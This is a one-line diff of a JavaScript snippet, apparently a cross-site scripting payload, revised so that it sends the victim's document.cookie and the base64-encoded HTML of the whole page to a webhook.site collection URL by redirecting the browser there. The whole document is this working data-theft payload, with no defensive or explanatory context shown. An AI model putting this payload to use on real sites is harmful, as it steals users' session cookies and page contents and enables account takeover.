@@ -1,1 +1,1 @@
-location='https://webhook.site/7640abab-7c98-44dd-9918-7c044cd8a89c?c='+document.cookie;
+location='https://webhook.site/7640abab-7c98-44dd-9918-7c044cd8a89c?cookie='+document.cookie+'&html='+btoa(document.documentElement.outerHTML);
